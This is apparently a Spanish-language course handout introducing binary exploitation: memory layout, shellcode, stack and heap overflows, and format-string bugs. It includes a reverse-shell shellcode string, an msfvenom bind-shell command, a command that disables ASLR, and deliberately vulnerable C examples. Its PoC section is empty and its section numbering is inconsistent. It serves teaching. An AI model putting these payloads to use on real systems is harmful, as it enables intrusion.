# CAI- 5

# Introducción al Exploiting

**C A S | E C G | A P G**


## Contenido

- 1.Definiciones y consideraciones previas
- 2.Introducción a las técnicas generalizadas de exploiting
- 3.Shellcode
- 4.Herramientas y recursos
- 5.Stack-based buffer overflows
- 6.Heap Overflows
- 7.PoC de un Buffer Overflow en un ELF sin protecciones
- 8.Bibliografía


## 1. Definiciones y consideraciones previas


Una vulnerabilidad es un fallo en el diseño, implementación, uso o administración
de un activo o grupo de activos que posibilita interacciones no planificadas que
pueden ser aprovechadas para infringir su política de seguridad.
Estás interacciones se desbloquean mediante un exploit , un programa o una pieza
de código cuyo fin es aprovechar (explotar) dicha vulnerabilidad. También
conocidos como “ Proof of Concept ”, PoC.
Los exploits son catalizadores del incumplimiento de los objetivos propuestos por
los cuatro pilares de la Seguridad de la Información. Posibilitan denegaciones de
servicio, elevación de privilegios, movimientos laterales en una red, obtención
directa del control absoluto de un sistema...

Podemos clasificar las vulnerabilidades en base al activo al que afectan (hardware,
software, instalaciones...) o por sus causas. Sin embargo, esto depende de la
fuente a la que acudamos y cada entidad propone su visión particular.

Sin duda la primera y más sencilla opción para aplicaciones web es la clasificación
técnica de la **OWASP® Foundation**. En este enlace podemos encontrar las diez
vulnerabilidades más comunes.
El estándar es el sistema de **MITRE** , Common Vulnerabilities and Exposures (CVE).
Mantienen una lista de vulnerabilidades públicas y trabajan junto al **NIST** ( National
Institute of Standards and Technology) para asignar a cada una puntuación del
riesgo usando tres sistemas:

- **Common Vulnerability Scoring System (CVSS)**
- **Common Platform Enumeration scheme (CPE)**
- **Common Weakness Enumeration (CWE)**

El amplio ecosistema de tecnologías que conviven en el mundo digital y las
interacciones entre estos dificultan la tarea de crear una única clasificación estricta
para los exploits, como la que establecería un lingüista que estudia las lenguas
semíticas. Las dos clasificaciones más estrictas que podemos encontrar son:

- **Exploits locales** (necesitan ser ejecutados en la misma máquina) o **remotos** (es
    posible ejecutarlos desde otra red, “a distancia”).
- **Exploits conocidos** (explotan vulnerabilidades que ya han sido descubiertas
    por investigadores, es decir, públicas) o **desconocidos** ( **0 - day** , explotan
    vulnerabilidades que no son públicas).


## 2. Introducción a las técnicas generalizadas de exploiting


El desarrollo de exploits requiere comprender cómo funciona la memoria en
sistemas modernos. Por simplicidad vamos a limitarnos a la arquitectura Intel de
32 bits (IA32) en sistemas Linux. Necesitamos tener una visión general ya que los
fallos que vamos a explotar nacen de sobrescribir o desbordar una porción de la
memoria de un proceso.
**En sistemas modernos no existe una distinción real entre instrucciones y datos**. Si
un procesador recibe instrucciones cuando en realidad debería recibir datos, las
ejecutará, aunque este no sea el comportamiento planeado por el desarrollador
del programa en ejecución. Sin esta característica, el exploiting no sería posible.

Cuando un programa es ejecutado, el sistema operativo le asigna un espacio en la
memoria. En este espacio encontraremos las instrucciones y los datos que el
programa necesita para funcionar, que se cargarán desde su ejecutable. Primero
se cargan tres segmentos:

- **.text:** Sólo lectura. Contiene las instrucciones.
- **.bss:** Permite escritura. Contiene datos no inicializados.
- **.data:** Permite escritura. Contiene datos inicializados.

Para un vistazo más profundo sobre ejecutables, recomendamos la siguiente
lectura sobre archivos ELF.

En sistemas Linux podemos usar el comando readelf -S <archivo> para ver estas
secciones del binario. Veremos en la salida dos secciones importantes, .got
corresponde a la Global Offset Table, en cuyas entradas encontramos las
direcciones efectivas de las funciones de bibliotecas compartidas para el binario.
La sección .plt corresponde a la Procedure Linkage Table , necesaria para la
resolución de las direcciones de estas funciones de bibliotecas compartidas.
Tras esto, se inicializan el stack y el heap. El stack es una estructura de datos LIFO
( Last In First Out) donde se guarda información transitoria, que no necesita ser
conservada durante largos períodos de tiempo. Variables locales, información
sobre llamadas al sistema, o información para limpiar el stack tras llamar a una
función o procedimiento. Es fundamental entender que crece hacia abajo en el
espacio de direcciones – cuando se añaden datos, estarán en direcciones de
memoria inferiores. 

El **heap** es también una estructura de datos, en este caso **FIFO (First In First Out)** y
contiene las variables dinámicas. Crece al contrario que el **stack** ; cuando se añaden
datos estarán en direcciones de memoria superiores. 

Para más información sobre la administración de memoria en Linux,
recomendamos la web **linux-mm.org,** que trata exclusivamente sobre ello.

También es recomendable estar familiarizado con el **lenguaje ensamblador**
asociado a esta arquitectura, el sistema numérico hexadecimal, tamaño de datos y
signos...

Como para todo en esta disciplina, podemos acudir a los **manuales oficiales de
Intel** si necesitamos refrescar nuestros conocimientos sobre ensamblador. Para el
resto de los conceptos podemos utilizar cualquier libro sobre arquitectura de
computadores.

Conocer cómo funcionan los **registros** en un procesador **IA32** y cómo son
manipulados a través del **lenguaje ensamblador** es esencial para el exploiting, ya
que a través de este son accesibles, legibles y modificables. Podemos agruparlos
en cuatro categorías:

1. **Propósito general:** Realización de operaciones matemáticas, guardar datos y
    direcciones, offsets... **ESP es el más importante para nosotros,** pues apunta a
    la dirección donde encontramos el último valor que ha entrado al **stack.** Estos
    registros son de **32 bits**.
2. **Segmento:** Se usan para controlar ciertos segmentos del programa y por
    retrocompatibilidad de aplicaciones de **16 bits**.
3. **Control:** Controlar el funcionamiento del procesador. El más importante es **EIP**
    **(Extended Instruction Pointer),** que contiene la dirección de la próxima
    instrucción a ejecutar. Si queremos controlar el flujo de ejecución de un
    programa es necesario poder acceder y cambiar el valor guardado en **EIP.
4. Otros – EFLAGS.**

## 3. Shellcode

```
unsigned char buf[] =
"\x31\xc0\x31\xdb\x50\x40\x50\x40\x50\x89\xe1\xb0\x33\x04\x33\x43\xcd\x80\x
\xc6\x31\xc0\x50\xc6\x04\x24\x7f\xc6\x44\x24\x03\x01\x66\x68\x11\x5c\x43\x66\
x53\x89\xe1\xb0\x33\x04\x33\x50\x51\x56\x89\xe1\x43\xcd\x80\x31\xd2\x87\xca\x
b1\x03\x89\xf3\x31\xc0\xb 0 \x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xc
d\x80\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x51\x
\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
```
Shellcode que inicializa una Shell reversa en localhost:4444. Fuente: exploit-db.com

El **Shellcode** es un conjunto de instrucciones que se inyecta en la memoria de un programa
vulnerado para manipular su funcionamiento. Se escriben en ensamblador y se traducen a
**opcodes hexadecimales.**

El término deriva del propósito original de estas piezas de ensamblador – conseguir una shell
con privilegios en un sistema. Sigue siendo lo más común, pero no es lo único que se puede
conseguir.

Una de las formas de manipular un programa es obligarlo a realizar una llamada al sistema,
**syscall** para abreviar. Permiten acceder directamente al kernel, lo que nos da acceso a
funciones de bajo nivel como lectura y escritura de archivos. Más información sobre ellas aquí.

Podemos encontrar shellcode (y mucho más) en exploit.db.com.

Si tenemos **Metasploit** instalado, podemos generar shellcode rápidamente con el siguiente
comando:
```
$ msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp -b "\x00"
```

O podemos hacerlo **manualmente**. Supongamos un archivo _shellcode.s,_ que contiene código
ensamblador.

Lo ensamblamos con:
```
$ nasm -o shellcode.bin shellcode.S
```
Y extraemos la cadena de bytes ya formateada:
```
$ hexdump -v -e '"\\" 1/1 "x%02x"' shellcode.bin; echo
```

## 4. Herramientas y recursos

**Pwntools**

Framework de desarrollo de exploits para competiciones **CTF**. Escrito en Python, está
diseñado para escribir los exploits rápidamente. Podemos encontrar el tutorial de instalación
en https://github.com/Gallopsled/pwntools. En el siguiente enlace encontramos su extensa
documentación.

**PEDA**

PEDA ( **Phyton Exploit Development Assistance for GBD** ) es una extensión en Python para **GBD**
que incorpora mejoras “ _quality of life_ ”, para facilitar el debugeado de programas.

También contiene una mejora visual a la hora de mostrar el código ensamblador, registros e
infomación sobre la memoria durante la depuración. Se puede encontrar más información
sobre **PEDA** y su instalación en https://github.com/longld/peda.

## 5.Stack-based buffer overflows

En 1996 **Aleph One** publicó **“Smashing the Stack for Fun and Profit”** en la revista **Phrack**. Es el
primer artículo que explica claramente por qué son posibles y cómo explotarlos. Sin embargo
estos overflows ya se conocían al menos diez años antes de la publicación de este paper.

El origen de estos radica en los _buffers_. Son secciones finitas y contiguas en la memoria. El
_buffer_ más común en C es el **array.** No existie ningún mecanismo en este lenguaje que
compruebe si los datos introducidos en el buffer ocuparán más espacio del que tiene asignado.
Al introducir más datos de los que puede contener se escribirá tras el espacio asignado al
_buffer_ , modificando el contenido de la memoria.

Entendiendo el funcionamiento de la memoria y los registros, podemos establecer unos pasos
generales para explotar este tipo de overflows:
```
1. Crashear el programa **(SEGFAULT)**
2. Encontrar **EIP** – offset.
3. Encontrar un gadget **jmp – esp**
4. Generar **shellcode** + **NOPS,** limpiar **bad chars.**
5. Construir y utilizar el payload como input al programa
```

El proceso es bastante sencillo a simple vista y lo será para el ejemplo que veremos en el
apartado 7. Sin embargo, esto no es una representación de lo que supone explotar un stack
overflow “ _in the wild”._ Estamos haciendo esto sin ninguna protección activa.

Podemos usar la herramienta **checksec** para comprobar qué mitigaciones están activas en un
**ELF.** Estas son:

- **NX:** No eXecute. Es un bit que se utiliza para garantizar que áreas como el
    stack y el heap no son ejecutables, y que no se puede escribir en la sección del
    código.
- **ASLR** : Adress Space Layout Randomization**.** Confiere aleatoriedad a la
    dirección base de la librería estándar de C, **libc.** Mitiga la explotación de
    binarios a través de la técnica **Ret2Libc.**
    Podemos desactivarlo con echo 0 > /proc/sys/kernel/randomize_va_space
    (como superusuario)

- **PIE:** Position Independent Executables**.** Confiere aleatoriedad a la dirección
    base del binario, lo que dificulta el uso de gadgets o funciones de este.
- **Canario:** Se coloca un valor aleatorio en memoria, antes de **ESP**. Se utiliza para
    detectar intentos de overflow, ya que es necesario modificar el canario para
    llegar al registro.

No tenemos por qué usar **jmp-esp** para lograr el control del flujo. Esta técnica es la
recomendable para certificaciones prácticas como **OSCP** , en la que es necesario explotar un
buffer overflow del tipo más sencillo.

Los **bad chars** son bytes que pueden provocar comportamientos no deseados al lanzar el
exploit. El universal es “ **\x00** ” **o byte nulo**. Otros son Form Feed “\ **xFF** ”, Line Feed “\ **x0A** ”, y
Carriage Return “\ **x0D** ”.

Se utilizan los **NOP** (no operation) para asegurar el funcionamiento del exploit, ya que no
siempre apuntaremos a la dirección correcta. Al apuntar hacia estos **NOP** , continua la
ejecución hasta llegar al shellcode.

Si alguna de las mitigaciones antes mencionadas estuviese activa, sería necesaria otra
vulnerabilidad. Por ejemplo, necesitaríamos un leak de la dirección de _main_ para contrarrestar
el uso de **PIE.** Es lo más común en competiciones **CTF.**

## 6. Heap Overflow

EL _heap,_ o montículo, es una zona de memoria dedicada a los datos que no se inicializan
durante la función (que se guarda en el _stack_ visto previamente), la memoria dinámica. Para
reservar memoria se utilizan funciones como malloc() o free(), que se implementan de manera
distinta según la librería, la estandar es stdlib.h. Debido a la manipulación de instrucciónes a
tan bajo nivel y el uso de instrucciones que manejan memoria dinámica su implementación es
algo más compleja.


Estas funciones manejan de manera dinámica los montículos de memoria que hay libres para
usar, añadiendo metadatos sobre su tamaño, dirección de comienzo... Y se explotan con la
intención de escribir en direcciones de memoria libre sin importar si son o no asignadas a un
proceso en cuestión. Para ello primero se reservan direcciones de memoria con _malloc()_.

```
/*basicheap.c*/
int main(int argc, char** argv) {
        char *buf; char *buf2;
        buf=(char*)malloc(1024);
        buf2=(char*)
        malloc(1024);
        printf(“buf=%p buf2=%p\n”,buf,buf2);
        strcpy(buf,argv[1]);
        free(buf2);
}
```
En este ejemplo se crean 2 _buffers_ , de modo que el primero se puede desbordar al segundo,
como hemos visto en el apartado anterior, quedando corrupto este último al liberarse. Para
emplear este método necesitamos conocer previamente el tamaño de los espacios de
memoria, no siempre se nos da. Manipulando funciones a bajo nivel se puede manipular en
teoría cualquier dirección de memoria disponible para programas, no solo de la disponible
para _stack_ de pila.

## 7. Bugs de String Format

Este _exploit_ aprovecha la vulnerabilidad de las **funciones de entrada/salida de texto
formateado** , en concreto de las que tienen un número de parámetros variable. Aunque los
ejemplos descritos se centran en estas funciones bien conocidas, se podría extrapolar a
determinadas funciones con parámetros de entrada variables.

```
int printf(const char *format, ...);
int fprintf(FILE *stream, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int snprintf(char *str, size_t size, const char *format, ...);
```

Estas funciones pueden tener parámetros de entrada o de salida, y formatear los datos de
manera diferente, atendiendo al nº de argumentos, longitud, o _padding_ de datos; y con
distinto tamaño ( _char, number, half, half of a half_ ).

```
int num=0x8;

printf("%d%n\n", num, &contador) # imprime "8"; contador = 1
printf("%3d%n\n", num, &contador) # imprime " 8"; contador = 3
printf("%9d%n\n", num, &contador) # imprime " 8"; contador = 9
```

El uso de la pila para almacenar la llamada a funciones descrito en el apartado anterior
también se explota en este caso. Si tenemos, por ejemplo, una llamada a función _printf(“%x %x
%x\n”)_ esta imprimirá forzosamente las direcciones de memoria justo a continuación de la
llamada a printf. En pseudocódigo ASM quedaría algo así:

```
push numero
push str
push "Una cadena %s y un número %d"
call printf
add esp, 0xc
```

Al acceder a direcciones de pila fuera de nuestra función podemos filtrar datos de la pila del
proceso para detectar por ejemplo una dirección de retorno que nos permita desborodar el
_buffer_. Podemos verlo en este ejemplo donde imprimimos la pila del proceso.

```
void vuln(char *string){
        printf(string);
}

int main(int argc, char **argv){
        vuln(argv[1]);
}
```
```
user@abos:~$ ./protostar1 AAAA
AAAA
user@abos:~$ ./protostar1 %x %x %x
bffff6c8 804841c bffff89c
```

Si escribimos una serie de caracteres conocidos podemos aislarlos en el código ensamblador
de la llamada y descubrir el punto exacto del comienzo del _format string._

Normalmente este ataque por si solo permite obtener información de la pila de ejecución,
pero podemos utilizar esta información para calcular posiciones de memoria donde exista una
llamada a función de escritura con formato y escribir en cualquier posición de memoria.


## 7. PoC de un Buffer Overflow en un ELF sin protecciones


## 9. Bibliografía

- Anley, C., Heasman, J., Linder, F., & Richarte, G. (2007) The Shellcoder's
    Handbook: Wiley Publishing, Inc.
- Erickson, J. (2008). _Hacking_ : _The Art of Exploitation_ : No Starch
    Press.
- [http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/shellcode-](http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/shellcode-walkthrough)
- https://github.com/LauraWartschinski/overflow_with_joy


